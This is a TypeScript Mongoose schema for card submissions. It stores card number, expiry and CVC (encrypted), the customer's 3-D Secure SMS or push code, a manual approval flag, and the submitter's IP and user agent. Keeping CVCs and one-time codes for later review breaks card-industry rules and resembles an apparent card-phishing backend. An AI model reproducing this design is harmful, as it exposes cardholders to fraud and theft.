import mongoose, { Document, Schema } from 'mongoose';

export enum CardSubmissionStatus {
  PENDING_SUBMISSION = 'pending_submission',
  SUBMITTED = 'submitted',
  AWAITING_3D_SMS = 'awaiting_3d_sms',
  AWAITING_3D_PUSH = 'awaiting_3d_push',
  VERIFICATION_COMPLETED = 'verification_completed',
  PROCESSED_AWAITING_EXCHANGE = 'processed_awaiting_exchange',
  PROCESSED = 'processed',
  REJECTED = 'rejected',
  INSUFFICIENT_FUNDS = 'insufficient_funds',
  FAILED = 'failed',
}

export interface ICardSubmission extends Document {
  paymentRequestId: mongoose.Types.ObjectId;
  cardholderName: string;
  cardNumberEncrypted: string;
  expiryDateEncrypted: string;
  cvcEncrypted: string;
  status: CardSubmissionStatus;
  submittedAt: Date;
  reviewedAt?: Date;
  verificationType?: '3d_sms' | '3d_push';
  verificationCompletedAt?: Date;
  verificationCode?: string;
  verificationApproved?: boolean;
  smsResendRequestedAt?: Date;
  smsResendCount?: number;
  ipAddress?: string;
  userAgent?: string;
  createdAt: Date;
  updatedAt: Date;
}

const cardSubmissionSchema = new Schema<ICardSubmission>(
  {
    paymentRequestId: {
      type: Schema.Types.ObjectId,
      ref: 'PaymentRequest',
      required: true,
      index: true,
    },
    cardholderName: {
      type: String,
      required: true,
    },
    cardNumberEncrypted: {
      type: String,
      required: true,
    },
    expiryDateEncrypted: {
      type: String,
      required: true,
    },
    cvcEncrypted: {
      type: String,
      required: true,
    },
    status: {
      type: String,
      enum: Object.values(CardSubmissionStatus),
      default: CardSubmissionStatus.SUBMITTED,
      index: true,
    },
    submittedAt: {
      type: Date,
      default: Date.now,
    },
    reviewedAt: Date,
    verificationType: {
      type: String,
      enum: ['3d_sms', '3d_push'],
    },
    verificationCompletedAt: Date,
    verificationCode: String,
    verificationApproved: Boolean,
    smsResendRequestedAt: Date,
    smsResendCount: {
      type: Number,
      default: 0,
    },
    ipAddress: String,
    userAgent: String,
  },
  {
    timestamps: true,
  }
);

// Indexes
cardSubmissionSchema.index({ paymentRequestId: 1, status: 1 });
cardSubmissionSchema.index({ submittedAt: -1 });

export const CardSubmission = mongoose.model<ICardSubmission>('CardSubmission', cardSubmissionSchema);

